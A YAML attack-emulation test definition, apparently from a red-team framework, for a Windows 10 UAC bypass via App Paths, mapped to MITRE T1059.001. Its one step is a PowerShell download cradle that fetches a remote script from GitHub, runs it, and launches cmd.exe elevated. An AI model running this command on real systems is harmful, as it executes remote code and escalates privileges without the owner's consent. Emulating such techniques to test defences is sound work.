api_version: "2.0"
name: Invoke-AppPathBypass
description: |
    Note: Windows 10 only. Upon execution windows backup and restore window will be opened.

    Bypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/
uuid: 06a220b6-7e29-4bd8-9d07-5b4d86742372
mitre:
    tactics:
        - 'TA0002: Execution'
    techniques:
        - 'T1059: Command and Scripting Interpreter'
    subtechniques:
        - 'T1059.001: PowerShell'
requirements:
    platforms:
        - os: windows
steps:
    - name: invoke-apppathbypass
      inline: |
        Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
      executor: command_prompt
      cleanup:
        inline: ""
        executor: command_prompt
